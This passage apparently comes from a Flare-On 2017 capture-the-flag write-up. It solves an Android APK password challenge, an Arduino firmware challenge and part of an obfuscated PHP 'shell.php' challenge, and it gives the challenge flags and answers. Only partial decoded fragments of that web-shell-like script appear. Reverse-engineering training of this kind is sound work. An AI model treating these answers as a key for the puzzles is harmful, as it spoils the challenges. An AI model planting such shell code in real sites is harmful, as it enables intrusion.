</span></code></pre><p>Then execute only this portion of code to see:</p><a href=/img/flareon-2017/dededfb9d354408d37fab58d50b62856c51ef5a3326ab05a42470df936f6dbf1.png target=_blank> <img alt=image_alt2 src=/img/flareon-2017/dededfb9d354408d37fab58d50b62856c51ef5a3326ab05a42470df936f6dbf1.png title=image_alt2 width=100%> </a><p>Which unhexlified gives the flag:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> "</span><span style=color:#a3be8c>6d756464316e675f62795f7930757235336c706840666c6172652d6f6e2e636f6d</span><span>".</span><span style=color:#bf616a>decode</span><span>('</span><span style=color:#a3be8c>hex</span><span>')
</span><span>mudd1ng_by_y0ur53lph@flare-on.com
</span></code></pre><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-8>Challenge 8</h1><h1 id=instruction-7>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>You seem to spend a lot of time looking at your phone. Maybe you would finish a mobile challenge faster.
</span><span>I want to play another game with you, but I also want you to be challenged
</span><span>because you weren't supposed to make it this far.
</span></code></pre><h1 id=solution-7>Solution</h1><p>This really fun challenge offers an Android APK file, <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!xFoXkTRa!L3h7J_copL4NuA3pEW0bR5Acrz7LeLXVFTV2sb_Ha08 target=_blank><code>flair.apk</code></a>. The static analysis was exclusively done with JADX and I used the awesome GenyMotion + JDB for the dynamic analysis.<p>This app presents itself as a traditional Android app, <code>com.flare_on.flair</code>:</p><a href=/img/flareon-2017/638b63ff20d2447bdcf9ca2f7dbf3e9a8800178722580185a0c9c7f86652f707.png target=_blank> <img alt=image_alt src=/img/flareon-2017/638b63ff20d2447bdcf9ca2f7dbf3e9a8800178722580185a0c9c7f86652f707.png title=image_alt width=100%> </a><p>You can get the final flag by solving the 4 mini challenges:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>1. Micheal
</span><span>2. Brian
</span><span>3. Milton
</span><span>4. Printer
</span></code></pre><h3 id=1-michael>1. Michael</h3><p>Using <code>JADX</code>, we can reach easily the method <code>simply solve com.flare_on.flair.Michael.checkPassword()</code>:</p><a href=/img/flareon-2017/ad3a22fa907e8c8185c87b256bfc4fa542c68eb5dfcc508d4ea8620adab9d859.png target=_blank> <img alt=image_alt src=/img/flareon-2017/ad3a22fa907e8c8185c87b256bfc4fa542c68eb5dfcc508d4ea8620adab9d859.png title=image_alt width=100%> </a><p>Which trivially gives us the first answer: <code>MYPRSHE__FTW</code><h3 id=2-brian>2. Brian</h3><p>Using <code>jdb</code>, it is possible to break at any location inside a running Android app. JADX shows that when the validation button is clicked on, the method <code>com.flare_on.flair.Brian.teraljdknh()</code> is called and checked for success. This function is a simple <code>memcmp()</code>-like function, so we can break on it and dump its arguments:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> jdb</span><span style=color:#bf616a> -attach</span><span> localhost:8700
</span><span>> methods </span><span style=color:#bf616a>com.flare_on.flair.Brian
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>com.flare_on.flair.Brian</span><span> dfysadf(java.lang.String, int, java.lang.String,java.lang.String)
</span><span style=color:#bf616a>com.flare_on.flair.Brian</span><span> teraljdknh(java.lang.String, java.lang.String)
</span><span style=color:#bf616a>[...]
</span><span>> stop </span><span style=color:#bf616a>in</span><span> com.flare_on.flair.Brian.teraljdknh
</span><span>(</span><span style=color:#bf616a>when</span><span> break hits)
</span><span>> locals
</span><span style=color:#bf616a>Method</span><span> arguments:
</span><span style=color:#bf616a>v</span><span> = "</span><span style=color:#a3be8c>AAAA</span><span>"
</span><span style=color:#bf616a>Local</span><span> variables:
</span><span style=color:#bf616a>m</span><span> = "</span><span style=color:#a3be8c>hashtag_covfefe_Fajitas!</span><span>"
</span></code></pre><p>We get the answer: <code>hashtag_covfefe_Fajitas!</code><h3 id=3-milton>3. Milton</h3><p>In the <code>Milton</code> class, we can see that the input field is not enabled unless the rating is equal to 4 (i.e. give 4 stars).<p>The <code>onClick</code> event will call the method <code>breop(&LTgiven_password>)</code>. That method will compare our input with the result of the call to the function <code>nbsadf()</code>. <code>nbsadf()</code> does nothing but call <code>Stapler.poserw()</code>. So let’s break on that with jdb:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>> stop in com.flare_on.flair.Stapler.poserw
</span><span>(wait for it)
</span><span>> main[1] dump intr
</span><span> intr = {
</span><span> 65, 32, 114, 105, 99, 104, 32, 109, 97, 110, 32, 105, 115, 32, 110, 111, 116,
</span><span> 104, 105, 110, 103, 32, 98, 117, 116, 32, 97, 32, 112, 111, 111, 114, 32, 109,
</span><span> 97, 110, 32, 119, 105, 116, 104, 32, 109, 111, 110, 101, 121, 46
</span><span> }
</span><span>> stop in java.util.Arrays.equals(byte[], byte[])
</span></code></pre><p>The variable <code>intr</code> holds our answer: <code>A rich man is nothing but a poor man with money.</code> Once decoded, we see that <code>Stapler.poserw()</code> is nothing more than a SHA1 checksum function.<p>So the answer is<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> </span><span style=color:#b48ead>import </span><span>hashlib
</span><span>>>> hashlib.</span><span style=color:#bf616a>sha1</span><span>('</span><span style=color:#a3be8c>A rich man is nothing but a poor man with money.</span><span>').</span><span style=color:#bf616a>hexdigest</span><span>()
</span><span>10aea594831e0b42b956c578ef9a6d44ee39938d
</span></code></pre><h3 id=4-printer>4. Printer</h3><p>The check in the <code>Printer</code> class takes the same principles than the ones covered in <code>Milton</code>. After deobfuscation, we can see that the check is also performed against <code>Stapler.poserw()</code>.<p>So use jdb to break and dump the values<pre style=color:#c0c5ce;background-color:#2b303b><code><span>> stop in java.util.Arrays.equals(byte[], byte[])
</span><span>> stop in com.flare_on.flair.Stapler.poserw
</span></code></pre><p>And we get:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> </span><span style=color:#b48ead>import </span><span>hashlib
</span><span>>>> hashlib.</span><span style=color:#bf616a>sha1</span><span>("</span><span style=color:#a3be8c>Give a man a fire and he'll be warm for a day. Set a man on fire and he'll be warm for the rest of his life.</span><span>")
</span><span>5f1be3c9b081c40ddfc4a0238156008ee71e24a4
</span></code></pre><p>And finally:</p><a href=/img/flareon-2017/7ecf50b91265cdd05f48d3910c20c9d48899a3e19645fbe263f8c34a696d00cc.png target=_blank> <img alt=image_alt src=/img/flareon-2017/7ecf50b91265cdd05f48d3910c20c9d48899a3e19645fbe263f8c34a696d00cc.png title=image_alt width=100%> </a><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-9>Challenge 9</h1><h1 id=instruction-8>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>One of our computer scientists recently got an Arduino board. He disappeared for
</span><span>two days and then he went crazy. In his notebook he scrawled some insane
</span><span>jibberish that looks like HEX. We transcribed it, can you solve it?
</span></code></pre><h1 id=solution-8>Solution</h1><p>The challenge is in a text file named <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!NFQwXKYQ!OhtgRSr6U4yRBMnflhIwGgMZJXYaEeMnJG-1m0bWFJ4 target=_blank><code>remorse.ino.hex</code></a>. This format (Intel HEX) is frequently used for sharing encoded firmware, and so the <code>python-intelhex</code> module provides a useful script to convert it back to binary (<code>hex2bin.py</code>). From the string inside the firmware, we learn that this firmware is meant to be used on a <a rel="noopener nofollow noreferrer" href=http://store.arduino.cc/products/arduino-uno-rev3/ target=_blank>Arduino Uno board</a>. This board embeds an Atmel AVR 8bit CPU, running at 16MHz. Easily enough, Google points us to the <a rel="noopener nofollow noreferrer" href=https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-7810-Automotive-Microcontrollers-ATmega328P_Datasheet.pdf target=_blank>datasheet of the processor.</a> Being totally new to AVR, I stop the challenge at that point for long enough to read a good part of the datasheet, which proved to be extremely useful for the rest of this exercise.<p>With a much better understanding of AVR, I setup a SimAVR environment and also compiled <code>simduino</code>, which allows me to connect a GDB to it, and debug the runtime:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> obj-x86_64-linux-gnu/simduino.elf</span><span style=color:#bf616a> -d -v -v</span><span> ../../../remorse.ino.hex
</span></code></pre><p>Simduino will open a /dev/pts that can be used for UART (so we can use tools like <code>picocom</code> or <code>minicom</code> to debug it).</p><a href=/img/flareon-2017/cd4cd292a48fa1fc086b50e5617459edec3e9d40513de244bf57428f0c372348.png target=_blank> <img alt=image_alt src=/img/flareon-2017/cd4cd292a48fa1fc086b50e5617459edec3e9d40513de244bf57428f0c372348.png title=image_alt width=100%> </a><p>The firmware seems to be expecting a new PIN configuration: luckily I came across this information in the datasheet (“35. Register Summary”).</p><a href=/img/flareon-2017/33d2e78e17819a705d01a9c9c0412090361e7ad02beb4692106996ac8e832f7b.png target=_blank> <img alt=image_alt src=/img/flareon-2017/33d2e78e17819a705d01a9c9c0412090361e7ad02beb4692106996ac8e832f7b.png title=image_alt width=100%> </a><p>After trying to manipulate the PINB and PINC (resp. at offset 0x23 and 0x26) without success, I saw that a change of value in PIND (offset 0x29) immediately provoked a response from the firmware:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> avr-gdb</span><span style=color:#bf616a>  -q -ex </span><span>'</span><span style=color:#a3be8c>target remote localhost:1234</span><span>'
</span><span style=color:#bf616a>[...]
</span><span>(</span><span style=color:#bf616a>gdb</span><span>) set {char}0x29=0
</span></code></pre><p>In <code>picocom</code>:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>Flare-On 2017 Adruino UNO Digital Pin state:0
</span></code></pre><p>Since the possible values are limited to 1 byte (8bit), and being lazy I wrote a GDB script to brute-force all the values<pre style=color:#c0c5ce;background-color:#2b303b><code><span>set $_i = 0
</span><span>define inc_pind
</span><span>        set $_i = $_i + 1
</span><span>        set {char}0x29=$_i
</span><span>        continue
</span><span>end
</span></code></pre><p>And then I use <code>xdotool</code> to programmatically send the right xkeysyms commands to the GDB terminal:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> i=0; </span><span style=color:#b48ead>while </span><span style=color:#96b5b4>[ </span><span>$</span><span style=color:#bf616a>i -lt</span><span> 256 </span><span style=color:#96b5b4>]</span><span>; </span><span style=color:#b48ead>do </span><span style=color:#bf616a>sleep</span><span> 5 ; </span><span style=color:#bf616a>xdotool</span><span> key ctrl+c Up Return ; </span><span style=color:#bf616a>i</span><span>=$</span><span style=color:#a3be8c>((i </span><span>+ </span><span style=color:#d08770>1</span><span style=color:#a3be8c>))</span><span>; </span><span style=color:#b48ead>done
</span></code></pre><p>Went for a coffee, and when back saw the pleasant screen:</p><a href=/img/flareon-2017/72de36af7ebcf629992d8b5f9f3a54e20cb01d6335fd961984d34b0840ea4b7e.png target=_blank> <img alt=image_alt3 src=/img/flareon-2017/72de36af7ebcf629992d8b5f9f3a54e20cb01d6335fd961984d34b0840ea4b7e.png title=image_alt3 width=100%> </a><p>This challenge was a good reminder that reading the documentation first kept me from spending probably hours of not understanding how the CPU was getting input/output data from the PIN or what the ABI was doing. So more than ever, RTFM!<p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-10>Challenge 10</h1><h1 id=instruction-9>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>We have tested you thoroughly on x86 reversing but we forgot to cover some of
</span><span>the basics of other systems. You will encounter many strange scripting languages
</span><span>on the Information Superhighway. I know that Interweb challenges are easy, but
</span><span>we just need you to complete this real quick for our records.
</span></code></pre><h1 id=solution-9>Solution</h1><p>Another guessing game type of challenge. The challenge comes as a PHP script named <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!MUAWhDTQ!qzAe4c6O0ADp3YyfCNVF0gimNSs44kvpLWwqcoldoKs target=_blank><code>shell.php</code></a>. It was solvable in 3 different steps:<h3 id=step-1-get-the-key-length>Step 1: get the key length</h3><p>This script is a mess so the cleaned version was pushed <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-clean-php target=_blank>here</a>.<p>This challenge is not about cracking the MD5 hash given, but reversing the way the variable <code>$block</code> is manipulated with the XOR operation. We don’t know the key <code>$param</code>, including its length. However, we do know that after <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-clean-php-L4 target=_blank>L4</a> the <code>strlen($param)</code> will be in [32..64]. Additionally, we know after this line that every byte of <code>$param</code> is in the hexadecimal namespace (“0123456789abcdef”). And finally, because of the call to <a rel="noopener nofollow noreferrer" href=http://php.net/manual/en/function.create-function.php target=_blank><code>create_function</code></a> line 15, we know that the block once de-XOR-ed will have all bytes in <code>string.printable</code>.<p>Now the guessing game starts: we must guess at the same time the length and the key. So the idea is in pseudo-code<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>assuming len(key) = 32
</span><span>assuming charset = "0123456789abcdef"
</span><span>let candidate = (key[0], len(32))
</span><span>test if key[0] ^ block[0] in string.printable and \
</span><span>     if (key[0] ^ block[0]) ^ block[0 + len(key)]in string.printable and \
</span><span>     etc.
</span><span>if any fails: reject candidate
</span></code></pre><p>This gives us a good iteration pattern, allowing us to narrow down all possible values <strong>and</strong> find the possible length for the key, as done in <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-bf1-py target=_blank><code>bf1.py</code></a><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> python bf1.py
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>0 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>c</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>0 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>d</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>0 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>e</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>1 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>a</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>1 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>b</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>1 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>c</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>1 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>d</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>1 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>e</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>2 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>0</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>2 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>1</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>2 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>2</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>pos</span><span>=</span><span style=color:#a3be8c>2 </span><span style=color:#bf616a>char</span><span>='</span><span style=color:#a3be8c>3</span><span>' </span><span style=color:#bf616a>len</span><span>=</span><span style=color:#a3be8c>64
</span><span style=color:#bf616a>[...]
</span></code></pre><p>Unanimously, we find that if the length of <code>$param</code> is 64 bytes, we have at least one candidate that ensures that we can de-xor <code>$block</code> and get ASCII back for each byte of the key.<p>So if <code>$param = md5($param) . substr(MD5(strrev($param)), 0, strlen($param));</code> and <code>strlen($param) == 64</code>, it means that our key <code>o_o</code> is 32 byte long, which way too huge to brute-force. Consequently we must unxor the block by another way, without knowing the key.<h3 id=step-2-unxor-all-the-blocks>Step 2: unxor all the blocks!</h3><p>The Step1 allowed us to get the key length along with a list of potential candidates for each position ([0, 63]). This 2nd step directly extends the earlier one by trying to brute-force chunk by chunk.<p>This will be the main idea:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>possible_candidates = {</span><span style=color:#d08770>0</span><span>: "</span><span style=color:#a3be8c>abc</span><span>", </span><span style=color:#d08770>1</span><span>: "</span><span style=color:#a3be8c>012</span><span>", </span><span style=color:#d08770>2</span><span>: "</span><span style=color:#a3be8c>f</span><span>", etc</span><span style=color:#d08770>...</span><span>}
</span><span>possible_block = []
</span><span>block_size = </span><span style=color:#d08770>4  </span><span style=color:#65737e># pure assumption
</span><span style=color:#b48ead>for </span><span>candidate </span><span style=color:#b48ead>in </span><span style=color:#bf616a>generate_all_candidates</span><span>( possible_candidates[</span><span style=color:#d08770>0</span><span>:block_size] ):
</span><span>  </span><span style=color:#b48ead>if </span><span>candidate ^ block[key_length*</span><span style=color:#d08770>0</span><span>:key_length*</span><span style=color:#d08770>0 </span><span>+ </span><span style=color:#d08770>4</span><span>] in string.printable and \
</span><span>     candidate ^ block[key_length*</span><span style=color:#d08770>1</span><span>:key_length*</span><span style=color:#d08770>1 </span><span>+ </span><span style=color:#d08770>4</span><span>] in string.printable and \
</span><span>     candidate ^ block[key_length*</span><span style=color:#d08770>2</span><span>:key_length*</span><span style=color:#d08770>2 </span><span>+ </span><span style=color:#d08770>4</span><span>] in string.printable and \
</span><span>     etc.. :
</span><span>     possible_block.</span><span style=color:#bf616a>append</span><span>(candidate)
</span></code></pre><p>I used Python’s <code>itertools.product</code> to generate all the candidate blocks, and little by little recovered the value for <code>$param</code>:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> python bf2.py
</span><span style=color:#bf616a>possible_key</span><span>=</span><span style=color:#a3be8c>de6952b84a49b934acb436418ad9d93d237df05769afc796d063000000000000
</span><span>(</span><span style=color:#bf616a>0, </span><span>'</span><span style=color:#a3be8c>$c=\</span><span>'</span><span style=color:#96b5b4>\'</span><span>;</span><span style=color:#96b5b4>\r\n</span><span>$</span><span style=color:#bf616a>key</span><span> = "";</span><span style=color:#96b5b4>\r\n</span><span style=color:#bf616a>if</span><span> (isset($</span><span style=color:#bf616a>_POST</span><span style=color:#b48ead>[</span><span style=color:#96b5b4>\'</span><span>o_o</span><span style=color:#96b5b4>\'</span><span style=color:#b48ead>]</span><span>))</span><span style=color:#96b5b4>\r\n  </span><span>$</span><span style=color:#bf616a>ka</span><span>'</span><span style=color:#a3be8c>)
</span><span style=color:#a3be8c>(64, </span><span>'</span><span style=color:#bf616a>oXo</span><span style=color:#96b5b4>\'</span><span style=color:#bf616a>]</span><span>;</span><span style=color:#96b5b4>\r\n</span><span style=color:#bf616a>if</span><span> (isset($</span><span style=color:#bf616a>_POST</span><span style=color:#b48ead>[</span><span style=color:#96b5b4>\'</span><span>hint</span><span style=color:#96b5b4>\'</span><span style=color:#b48ead>]</span><span>))</span><span style=color:#96b5b4>\r\n  </span><span>$</span><span style=color:#bf616a>d</span><span> = "</span><span style=color:#a3be8c>www.p01*')
</span><span style=color:#a3be8c>(128, </span><span>"stet($</span><span style=color:#bf616a>_POST</span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>t</span><span>'</span><span style=color:#b48ead>]</span><span>)) </span><span style=color:#bf616a>{</span><span style=color:#96b5b4>\r\n</span><span>  if ($</span><span style=color:#bf616a>_POST</span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>t</span><span>'</span><span style=color:#b48ead>]</span><span> == '</span><span style=color:#a3be8c>c</span><span>') </span><span style=color:#bf616a>{</span><span style=color:#96b5b4>\r\n</span><span>$"</span><span style=color:#a3be8c>)
</span><span style=color:#a3be8c>(192, </span><span>"</span><span style=color:#bf616a>63_decode</span><span>('</span><span style=color:#a3be8c>SDcGHg1feVUIEhsbDxFhIBIYFQY+VwMWTyAcOhEYE")
</span><span style=color:#a3be8c>(256, </span><span>'DJXTWxrSH4ZS1IiAgA3GxYUQVMvBFdVTysRMQAaQUxZYTlsTg0MA'</span><span style=color:#a3be8c>)
</span><span style=color:#a3be8c>(320, </span><span>'whbXgcxHQRBAxMcWwodHV5EfxQfAAYrMlsCQlJBAAAAAAAAAAAAE'</span><span style=color:#a3be8c>)
</span><span style=color:#a3be8c>[...]
</span></code></pre><p>After a few iteration, it appears that the encoded block contains not just pure PHP but also HTML, which allowed me to perfect the <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-bf2-py-L6 target=_blank>condition for finding a valid candidate</a><p>After many iterations, we get the value for <code>$param</code>:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$param = "db6952b84a49b934acb436418ad9d93d237df05769afc796d067bccb379f2cac";
</span></code></pre><h3 id=step-3>Step 3</h3><p>Entering the correct value for <code>$param</code> found in step 2 allow us to discover the <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-decoded_script-php target=_blank>decoded script</a> passed to <code>create_function()</code>.<p>And back to square 1, we have 3 new base64-encoded blocks to decode. Depending on the value given in the <code>$_POST['t']</code> (can be ‘c’, ‘s’ or ‘w’), will split the key every 3 character, starting from index 0, 1, or 2 (respectively).<p>I took a huge assumption here, which was that <code>$key</code> would be the flag to end the challenge. Therefore, even though we don’t know its length (yet), we know that it ends with <code>@flare-on.com</code>.<p>So for this step, I used the same technique than step2 but split the key every 3 characters and see if the block of byte was successfully decoded.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>key = "</span><span style=color:#a3be8c>fla</span><span>"+"</span><span style=color:#a3be8c>re-</span><span>"+"</span><span style=color:#a3be8c>on.</span><span>"+"</span><span style=color:#a3be8c>com</span><span>"
</span><span style=color:#b48ead>for </span><span>j </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>3</span><span>):
</span><span>    k = key[j::</span><span style=color:#d08770>3</span><span>]
</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>11</span><span>):
</span><span>        x = </span><span style=color:#bf616a>xor</span><span>( </span><span style=color:#bf616a>b64d</span><span>(c), "</span><span style=color:#a3be8c>A</span><span>"*i+k)[i::i+</span><span style=color:#96b5b4>len</span><span>(k)]
</span><span>        </span><span style=color:#b48ead>if </span><span style=color:#bf616a>is_all_printable</span><span>(x):
</span><span>            </span><span style=color:#b48ead>print </span><span>j, i, </span><span style=color:#96b5b4>repr</span><span>(x)
</span></code></pre><p>Just like step1 this approach gives us 2 possible length for the flag prefix (i.e. before <code>@flare-on.com</code>): 8 or 9 bytes.<p>So there again, semi-manual brute-force:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>i = </span><span style=color:#d08770>9
</span><span>k0 = key[</span><span style=color:#d08770>0</span><span>::</span><span style=color:#d08770>3</span><span>]
</span><span style=color:#b48ead>for </span><span>t </span><span style=color:#b48ead>in </span><span>string.printable:
</span><span>    p = "</span><span style=color:#a3be8c>A</span><span>"*(i-</span><span style=color:#d08770>1</span><span>) + t + k0
</span><span>    x = </span><span style=color:#bf616a>xor</span><span>(</span><span style=color:#bf616a>b64d</span><span>(c), p)
</span><span>    b = </span><span style=color:#bf616a>all_printable_blocks</span><span>(x, i-</span><span style=color:#d08770>1</span><span>, </span><span style=color:#96b5b4>len</span><span>(p), </span><span style=color:#96b5b4>len</span><span>(p)-(i-</span><span style=color:#d08770>1</span><span>))
</span><span>    </span><span style=color:#b48ead>if </span><span>b != []:
</span><span>        </span><span style=color:#b48ead>print </span><span>p, b
</span></code></pre><p>We quickly notice that the output has some HTML in it, so we can discard candidates with invalid HTML patterns. For example:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>➜</span><span>  python  bf.py
</span><span style=color:#bf616a>AAAAAAAA0froc </span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>8titl</span><span>', '</span><span style=color:#a3be8c>ged C</span><span>', '</span><span style=color:#a3be8c>`&LT/ti</span><span>', '</span><span style=color:#a3be8c>)- Ma</span><span>', "</span><span style=color:#a3be8c>41' H</span><span>", '</span><span style=color:#a3be8c>\t\n&LTbo</span><span>', '</span><span style=color:#a3be8c>pext=</span><span>', '</span><span style=color:#a3be8c>klor=</span><span>', '</span><span style=color:#a3be8c>kd0="</span><span>', '</span><span style=color:#a3be8c>0froc</span><span>', '</span><span style=color:#a3be8c>$titl</span><span>', '</span><span style=color:#a3be8c>phieu</span><span>', '</span><span style=color:#a3be8c>anri"</span><span>', '</span><span style=color:#a3be8c>gript</span><span>', '</span><span style=color:#a3be8c>perva</span><span>', '</span><span style=color:#a3be8c>/=7,i</span><span>', "</span><span style=color:#a3be8c>X</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>n';</span><span>", '</span><span style=color:#a3be8c>/=P[i</span><span>', '</span><span style=color:#a3be8c>n-j+n</span><span>', '</span><span style=color:#a3be8c>6])j=</span><span>', '</span><span style=color:#a3be8c>jerHT</span><span>', '</span><span style=color:#a3be8c>ge(4)</span><span>', '</span><span style=color:#a3be8c>+scri</span><span>', '</span><span style=color:#a3be8c>kdy>\r</span><span>'</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>AAAAAAAA2froc </span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>:titl</span><span>', '</span><span style=color:#a3be8c>eed C</span><span>', '</span><span style=color:#a3be8c>b&LT/ti</span><span>', '</span><span style=color:#a3be8c>+- Ma</span><span>', "</span><span style=color:#a3be8c>61' H</span><span>", '</span><span style=color:#a3be8c>\x0b\n&LTbo</span><span>', '</span><span style=color:#a3be8c>rext=</span><span>', '</span><span style=color:#a3be8c>ilor=</span><span>', '</span><span style=color:#a3be8c>id0="</span><span>', '</span><span style=color:#a3be8c>2froc</span><span>', '</span><span style=color:#a3be8c>&titl</span><span>', '</span><span style=color:#a3be8c>rhieu</span><span>', '</span><span style=color:#a3be8c>cnri"</span><span>', '</span><span style=color:#a3be8c>eript</span><span>', '</span><span style=color:#a3be8c>rerva</span><span>', '</span><span style=color:#a3be8c>-=7,i</span><span>', "</span><span style=color:#a3be8c>Z</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>n';</span><span>", '</span><span style=color:#a3be8c>-=P[i</span><span>', '</span><span style=color:#a3be8c>l-j+n</span><span>', '</span><span style=color:#a3be8c>4])j=</span><span>', '</span><span style=color:#a3be8c>herHT</span><span>', '</span><span style=color:#a3be8c>ee(4)</span><span>', '</span><span style=color:#a3be8c>)scri</span><span>', '</span><span style=color:#a3be8c>idy>\r</span><span>'</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>AAAAAAAA3froc </span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>;titl</span><span>', '</span><span style=color:#a3be8c>ded C</span><span>', '</span><span style=color:#a3be8c>c&LT/ti</span><span>', '</span><span style=color:#a3be8c>*- Ma</span><span>', "</span><span style=color:#a3be8c>71' H</span><span>", '</span><span style=color:#a3be8c>\n\n&LTbo</span><span>', '</span><span style=color:#a3be8c>sext=</span><span>', '</span><span style=color:#a3be8c>hlor=</span><span>', '</span><span style=color:#a3be8c>hd0="</span><span>', '</span><span style=color:#a3be8c>3froc</span><span>', "</span><span style=color:#a3be8c>'titl</span><span>", '</span><span style=color:#a3be8c>shieu</span><span>', '</span><span style=color:#a3be8c>bnri"</span><span>', '</span><span style=color:#a3be8c>dript</span><span>', '</span><span style=color:#a3be8c>serva</span><span>', '</span><span style=color:#a3be8c>,=7,i</span><span>', "</span><span style=color:#a3be8c>[</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>n';</span><span>", '</span><span style=color:#a3be8c>,=P[i</span><span>', '</span><span style=color:#a3be8c>m-j+n</span><span>', '</span><span style=color:#a3be8c>5])j=</span><span>', '</span><span style=color:#a3be8c>ierHT</span><span>', '</span><span 